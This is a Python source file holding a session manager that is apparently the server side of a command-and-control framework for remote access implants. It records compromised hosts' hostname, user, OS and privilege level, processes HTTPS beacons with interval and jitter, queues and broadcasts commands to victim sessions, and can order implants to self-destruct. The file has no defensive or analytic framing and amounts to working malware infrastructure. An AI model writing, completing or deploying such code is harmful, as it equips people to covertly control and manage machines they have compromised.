import threading, queue, time, json, hashlib
from datetime import datetime
from collections import OrderedDict

class SessionManager:
    def __init__(self, max_sessions=1000):
        self.sessions = OrderedDict()
        self.lock = threading.RLock()
        self.max_sessions = max_sessions
        self.session_timeout = 300  # 5 minutes
        
    def add(self, session_id, session_info):
        """Add a new session."""
        with self.lock:
            if len(self.sessions) >= self.max_sessions:
                # Remove oldest session
                oldest = next(iter(self.sessions))
                del self.sessions[oldest]
            
            # Default session structure
            default_info = {
                'id': session_id,
                'address': '0.0.0.0',
                'port': 0,
                'hostname': 'Unknown',
                'user': 'Unknown',
                'os': 'Unknown',
                'privilege': 'User',
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'socket': None,
                'pending_commands': queue.Queue(),
                'beacon_interval': 30,
                'jitter': 5,
                'active': True,
                'metadata': {}
            }
            
            default_info.update(session_info)
            self.sessions[session_id] = default_info
            
            return True
    
    def update_beacon(self, session_id, beacon_data, client_address):
        """Update session with beacon data (for HTTPS)."""
        if session_id in self.sessions:
            session = self.sessions[session_id]
            session['last_seen'] = datetime.now().isoformat()
            session['beacon_data'] = beacon_data
            session['address'] = client_address[0]
            
            # Update info from beacon
            for key in ['hostname', 'user', 'os', 'privilege']:
                if key in beacon_data:
                    session[key] = beacon_data[key]
            
            return True
        return False
        
    def get(self, session_id):
        """Get session by ID."""
        with self.lock:
            return self.sessions.get(session_id)
    
    def update(self, session_id, updates):
        """Update session information."""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].update(updates)
                self.sessions[session_id]['last_seen'] = datetime.now().isoformat()
                return True
            return False
    
    def remove(self, session_id):
        """Remove a session."""
        with self.lock:
            if session_id in self.sessions:
                # Close socket if open
                session = self.sessions[session_id]
                if session.get('socket'):
                    try:
                        session['socket'].close()
                    except:
                        pass
                
                del self.sessions[session_id]
                return True
            return False
    
    def kill(self, session_id):
        """Kill a session (send termination command)."""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                
                # Queue self-destruct command
                self.queue_command(session_id, {
                    'type': 'selfdestruct',
                    'data': ''
                })
                
                # Mark for removal
                session['active'] = False
                
                return True
            return False
    
    def exists(self, session_id):
        """Check if session exists."""
        with self.lock:
            return session_id in self.sessions
    
    def list_all(self):
        """List all sessions."""
        with self.lock:
            # Cleanup timed out sessions
            self.cleanup_timeouts()
            
            return self.sessions.copy()
    
    def cleanup_timeouts(self):
        """Remove timed out sessions."""
        with self.lock:
            current_time = time.time()
            to_remove = []
            
            for session_id, session in self.sessions.items():
                last_seen = datetime.fromisoformat(session['last_seen']).timestamp()
                if current_time - last_seen > self.session_timeout:
                    to_remove.append(session_id)
            
            for session_id in to_remove:
                self.remove(session_id)
    
    def queue_command(self, session_id, command):
        """Queue a command for a session."""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['pending_commands'].put(command)
                return True
            return False
    
    def get_queued_command(self, session_id):
        """Get next queued command for session."""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                try:
                    return session['pending_commands'].get_nowait()
                except queue.Empty:
                    return None
            return None
    
    def clear_commands(self, session_id):
        """Clear all queued commands for session."""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                while not session['pending_commands'].empty():
                    try:
                        session['pending_commands'].get_nowait()
                    except queue.Empty:
                        break
                return True
            return False
    
    def broadcast_command(self, command, filter_func=None):
        """Broadcast command to all sessions (optionally filtered)."""
        with self.lock:
            results = {}
            
            for session_id in self.sessions:
                if filter_func is None or filter_func(self.sessions[session_id]):
                    self.queue_command(session_id, command)
                    results[session_id] = True
            
            return results
    
    def get_session_count(self):
        """Get total session count."""
        with self.lock:
            return len(self.sessions)
    
    def get_active_count(self):
        """Get count of active sessions."""
        with self.lock:
            return sum(1 for s in self.sessions.values() if s.get('active', True))
    
    def search_sessions(self, criteria):
        """Search sessions based on criteria."""
        with self.lock:
            results = {}
            
            for session_id, session in self.sessions.items():
                match = True
                
                for key, value in criteria.items():
                    if key in session:
                        if callable(value):
                            if not value(session[key]):
                                match = False
                                break
                        elif session[key] != value:
                            match = False
                            break
                    else:
                        match = False
                        break
                
                if match:
                    results[session_id] = session
            
            return results
    
    def get_session_stats(self):
        """Get session statistics."""
        with self.lock:
            stats = {
                'total': len(self.sessions),
                'active': self.get_active_count(),
                'by_os': {},
                'by_privilege': {},
                'by_user': {},
                'average_beacon': 0,
                'oldest': None,
                'newest': None
            }
            
            if self.sessions:
                beacon_intervals = []
                oldest_time = time.time()
                newest_time = 0
                
                for session in self.sessions.values():
                    # OS distribution
                    os_name = session.get('os', 'Unknown')
                    stats['by_os'][os_name] = stats['by_os'].get(os_name, 0) + 1
                    
                    # Privilege distribution
                    priv = session.get('privilege', 'User')
                    stats['by_privilege'][priv] = stats['by_privilege'].get(priv, 0) + 1
                    
                    # User distribution
                    user = session.get('user', 'Unknown')
                    stats['by_user'][user] = stats['by_user'].get(user, 0) + 1
                    
                    # Beacon intervals
                    beacon_intervals.append(session.get('beacon_interval', 30))
                    
                    # Timestamps
                    first_seen = datetime.fromisoformat(session['first_seen']).timestamp()
                    if first_seen < oldest_time:
                        oldest_time = first_seen
                        stats['oldest'] = session['id']
                    
                    if first_seen > newest_time:
                        newest_time = first_seen
                        stats['newest'] = session['id']
                
                # Average beacon interval
                if beacon_intervals:
                    stats['average_beacon'] = sum(beacon_intervals) / len(beacon_intervals)
                
                stats['oldest_time'] = datetime.fromtimestamp(oldest_time).isoformat() if stats['oldest'] else None
                stats['newest_time'] = datetime.fromtimestamp(newest_time).isoformat() if stats['newest'] else None
            
            return stats
    
    def export_sessions(self, filepath):
        """Export sessions to file."""
        with self.lock:
            export_data = {
                'export_time': datetime.now().isoformat(),
                'session_count': len(self.sessions),
                'sessions': self.sessions
            }
            
            try:
                with open(filepath, 'w') as f:
                    json.dump(export_data, f, indent=2, default=str)
                return True
            except:
                return False
    
    def import_sessions(self, filepath):
        """Import sessions from file."""
        try:
            with open(filepath, 'r') as f:
                import_data = json.load(f)
            
            if 'sessions' in import_data:
                with self.lock:
                    self.sessions.clear()
                    self.sessions.update(import_data['sessions'])
                return True
            
            return False
            
        except:
            return False
    
    def __del__(self):
        """Cleanup on destruction."""
        with self.lock:
            for session in self.sessions.values():
                if session.get('socket'):
                    try:
                        session['socket'].close()
                    except:
                        pass